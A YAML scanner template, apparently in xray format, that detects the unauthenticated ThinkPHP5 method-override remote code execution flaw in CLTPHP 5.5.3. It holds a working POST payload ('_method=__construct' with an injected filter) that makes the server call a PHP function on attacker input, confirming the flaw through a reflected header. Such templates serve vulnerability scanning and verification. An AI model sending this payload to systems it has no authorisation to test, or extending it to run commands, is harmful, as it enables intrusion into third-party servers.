name: poc-yaml-cltphp-v5-thinkphp5-method-rce
binding: b3ab47cf-6ad2-4d34-ab07-533877e8c3c7
manual: true
detail:
    author: 10cker(https://github.com/10cker)
    vulnerability:
        id: CT-529758
        level: critical
    description: |
        cltphp v5.5.3  - Unauthenticated ThinkPHP5 Method RCE
transport: http
set:
    s1: randomLowercase(10)
    s2: randomLowercase(20)
rules:
    r1:
        request:
            cache: true
            method: POST
            path: /?s=user/login
            headers:
                Content-Type: application/x-www-form-urlencoded
                X-Requested-With: XMLHttpRequest
            body: |
                _method=__construct&method=POST&filter[]=header&username={{s1}}:{{s2}}
        expression: response.status == 200 && response.headers[s1] == s2
expression: r1()
